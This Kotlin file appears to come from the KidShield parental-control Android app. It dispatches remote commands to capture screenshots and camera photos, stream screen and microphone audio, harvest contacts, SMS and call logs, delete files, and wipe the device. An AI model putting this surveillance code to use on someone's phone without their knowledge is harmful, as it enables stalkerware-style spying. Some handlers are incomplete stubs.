package com.kidshield.agent.service

import android.app.KeyguardManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.media.RingtoneManager
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.Settings
import android.view.WindowManager
import androidx.core.content.ContextCompat
import com.kidshield.agent.data.remote.api.DeviceCommand
import com.kidshield.agent.data.repository.KidShieldRepository
import com.kidshield.agent.receiver.DeviceAdminReceiver
import com.kidshield.agent.ui.main.LostModeActivity
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.toRequestBody
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class DeviceCommandHandler @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: KidShieldRepository,
    private val screenCaptureService: ScreenCaptureService,
    private val audioStreamingService: AudioStreamingService,
    private val cameraCaptureService: CameraCaptureService,
    private val fileBrowserService: FileBrowserService
) {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var alarmJob: Job? = null

    fun handleCommand(command: DeviceCommand) {
        scope.launch {
            when (command.type) {
                "sync_now" -> syncNow()
                "refresh_data" -> refreshData()
                "restart_service" -> restartService()
                "lock_device" -> lockDevice()
                "unlock_device" -> unlockDevice()
                "play_alarm" -> playAlarm()
                "stop_alarm" -> stopAlarm()
                "lost_mode" -> enableLostMode()
                "disable_lost_mode" -> disableLostMode()
                "block_app" -> blockApp(command)
                "unblock_app" -> unblockApp(command)
                "screenshot" -> takeScreenshot()
                "start_stream" -> startScreenStream(command)
                "stop_stream" -> stopScreenStream()
                "camera_front" -> captureCamera("1")
                "camera_rear" -> captureCamera("0")
                "start_audio" -> startAudioStream()
                "stop_audio" -> stopAudioStream()
                "get_files" -> getFiles(command)
                "delete_file" -> deleteFile(command)
                "get_apps" -> getApps()
                "get_contacts" -> getContacts()
                "get_sms" -> getSms()
                "get_calls" -> getCalls()
                "get_location" -> getLocation()
                "wipe_data" -> wipeData()
            }
            repository.acknowledgeCommand(command.id)
        }
    }

    private suspend fun syncNow() {
        repository.syncLocations()
        repository.syncAppUsage()
        repository.syncScreenTime()
        repository.syncNotifications()
        repository.syncContacts()
        repository.syncSms()
        repository.syncCallLogs()
    }

    private suspend fun refreshData() {
        repository.saveDeviceInfo()
        syncNow()
    }

    private fun restartService() {
        KidShieldService.start(context)
    }

    private fun lockDevice() {
        val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
        if (devicePolicyManager.isAdminActive(adminComponent)) {
            devicePolicyManager.lockNow()
        }
    }

    private fun unlockDevice() {
        val keyguardManager = context.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            keyguardManager.requestDismissKeyguard(context as android.app.Activity, null)
        }
    }

    private fun playAlarm() {
        alarmJob?.cancel()
        val vibrator = ContextCompat.getSystemService(context, Vibrator::class.java)
        val ringtone = RingtoneManager.getRingtone(context, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM))
        ringtone.play()
        alarmJob = scope.launch {
            while (isActive) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vibrator?.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vibrator?.vibrate(1000)
                }
                delay(1500)
            }
        }
        // Stop after 60 seconds
        scope.launch {
            delay(60000)
            ringtone.stop()
            alarmJob?.cancel()
        }
    }

    private fun stopAlarm() {
        alarmJob?.cancel()
    }

    private fun enableLostMode() {
        val intent = Intent(context, LostModeActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
        }
        context.startActivity(intent)
    }

    private fun disableLostMode() {
        val intent = Intent("com.kidshield.agent.DISABLE_LOST_MODE")
        context.sendBroadcast(intent)
    }

    private suspend fun blockApp(command: DeviceCommand) {
        val pkg = command.payload?.get("packageName") as? String ?: return
        val name = command.payload?.get("appName") as? String ?: pkg
        repository.blockApp(pkg, name, "parent")
    }

    private suspend fun unblockApp(command: DeviceCommand) {
        val pkg = command.payload?.get("packageName") as? String ?: return
        repository.unblockApp(pkg)
    }

    private fun takeScreenshot() {
        screenCaptureService.captureScreenshot { bytes ->
            bytes?.let {
                val body = it.toRequestBody("image/jpeg".toMediaTypeOrNull())
                val part = MultipartBody.Part.createFormData("image", "screenshot.jpg", body)
                scope.launch {
                    repository.uploadScreenshot(part)
                }
            }
        }
    }

    private fun startScreenStream(command: DeviceCommand) {
        val quality = command.payload?.get("quality") as? String ?: "720p"
        val (width, height) = when (quality) {
            "480p" -> Pair(854, 480)
            "1080p" -> Pair(1920, 1080)
            else -> Pair(1280, 720)
        }
        val fps = (command.payload?.get("fps") as? Number)?.toInt() ?: 15
        val bitrate = (command.payload?.get("bitrate") as? Number)?.toInt() ?: 2000000
        screenCaptureService.startLiveStream(width, height, fps, bitrate) { frame ->
            // Send frame via WebSocket
        }
    }

    private fun stopScreenStream() {
        screenCaptureService.stopLiveStream()
    }

    private fun captureCamera(cameraId: String) {
        cameraCaptureService.capturePhoto(cameraId) { bytes ->
            bytes?.let {
                val body = it.toRequestBody("image/jpeg".toMediaTypeOrNull())
                val part = MultipartBody.Part.createFormData("image", "camera.jpg", body)
                scope.launch {
                    repository.uploadScreenshot(part)
                }
            }
        }
    }

    private fun startAudioStream() {
        audioStreamingService.startStreaming { audioData ->
            // Send audio data via WebSocket
        }
    }

    private fun stopAudioStream() {
        audioStreamingService.stopStreaming()
    }

    private suspend fun getFiles(command: DeviceCommand) {
        val type = command.payload?.get("type") as? String ?: "images"
        val files = when (type) {
            "images" -> fileBrowserService.getImages()
            "videos" -> fileBrowserService.getVideos()
            "audio" -> fileBrowserService.getAudio()
            "downloads" -> fileBrowserService.getDownloads()
            "documents" -> fileBrowserService.getDocuments()
            else -> emptyList()
        }
        // Send files list to parent
    }

    private fun deleteFile(command: DeviceCommand) {
        val path = command.payload?.get("path") as? String ?: return
        fileBrowserService.deleteFile(path)
    }

    private suspend fun getApps() {
        val pm = context.packageManager
        val apps = pm.getInstalledApplications(0).map { app ->
            com.kidshield.agent.data.remote.api.AppInfo(
                packageName = app.packageName,
                appName = pm.getApplicationLabel(app).toString(),
                version = try { pm.getPackageInfo(app.packageName, 0).versionName ?: "" } catch (e: Exception) { "" },
                versionCode = try { pm.getPackageInfo(app.packageName, 0).longVersionCode } catch (e: Exception) { 0 },
                installTime = try { pm.getPackageInfo(app.packageName, 0).firstInstallTime } catch (e: Exception) { 0 },
                updateTime = try { pm.getPackageInfo(app.packageName, 0).lastUpdateTime } catch (e: Exception) { 0 },
                isSystemApp = (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
            )
        }
        repository.sendAppList(apps)
    }

    private suspend fun getContacts() {
        val contacts = mutableListOf<com.kidshield.agent.data.local.entity.ContactEntity>()
        context.contentResolver.query(
            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID
            ),
            null, null, null
        )?.use { cursor ->
            val nameIndex = cursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberIndex = cursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (cursor.moveToNext()) {
                contacts.add(com.kidshield.agent.data.local.entity.ContactEntity(
                    name = cursor.getString(nameIndex) ?: "",
                    phoneNumber = cursor.getString(numberIndex) ?: "",
                    email = null
                ))
            }
        }
        repository.saveContacts(contacts)
        repository.syncContacts()
    }

    private suspend fun getSms() {
        val smsList = mutableListOf<com.kidshield.agent.data.local.entity.SmsEntity>()
        context.contentResolver.query(
            android.provider.Telephony.Sms.CONTENT_URI,
            arrayOf(
                android.provider.Telephony.Sms.ADDRESS,
                android.provider.Telephony.Sms.BODY,
                android.provider.Telephony.Sms.DATE,
                android.provider.Telephony.Sms.TYPE
            ),
            null, null, "${android.provider.Telephony.Sms.DATE} DESC"
        )?.use { cursor ->
            val addressIndex = cursor.getColumnIndex(android.provider.Telephony.Sms.ADDRESS)
            val bodyIndex = cursor.getColumnIndex(android.provider.Telephony.Sms.BODY)
            val dateIndex = cursor.getColumnIndex(android.provider.Telephony.Sms.DATE)
            val typeIndex = cursor.getColumnIndex(android.provider.Telephony.Sms.TYPE)
            while (cursor.moveToNext()) {
                smsList.add(com.kidshield.agent.data.local.entity.SmsEntity(
                    sender = cursor.getString(addressIndex) ?: "",
                    receiver = "",
                    message = cursor.getString(bodyIndex) ?: "",
                    timestamp = cursor.getLong(dateIndex),
                    type = cursor.getInt(typeIndex)
                ))
            }
        }
        repository.saveSms(smsList)
        repository.syncSms()
    }

    private suspend fun getCalls() {
        val callLogs = mutableListOf<com.kidshield.agent.data.local.entity.CallLogEntity>()
        context.contentResolver.query(
            android.provider.CallLog.Calls.CONTENT_URI,
            arrayOf(
                android.provider.CallLog.Calls.NUMBER,
                android.provider.CallLog.Calls.CACHED_NAME,
                android.provider.CallLog.Calls.TYPE,
                android.provider.CallLog.Calls.DURATION,
                android.provider.CallLog.Calls.DATE
            ),
            null, null, "${android.provider.CallLog.Calls.DATE} DESC"
        )?.use { cursor ->
            val numberIndex = cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
            val nameIndex = cursor.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)
            val typeIndex = cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE)
            val durationIndex = cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION)
            val dateIndex = cursor.getColumnIndex(android.provider.CallLog.Calls.DATE)
            while (cursor.moveToNext()) {
                callLogs.add(com.kidshield.agent.data.local.entity.CallLogEntity(
                    number = cursor.getString(numberIndex) ?: "",
                    name = cursor.getString(nameIndex),
                    type = cursor.getInt(typeIndex),
                    duration = cursor.getLong(durationIndex),
                    timestamp = cursor.getLong(dateIndex)
                ))
            }
        }
        repository.saveCallLogs(callLogs)
        repository.syncCallLogs()
    }

    private suspend fun getLocation() {
        // Trigger location sync
        repository.syncLocations()
    }

    private fun wipeData() {
        val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
        if (devicePolicyManager.isAdminActive(adminComponent)) {
            devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE)
        }
    }
}
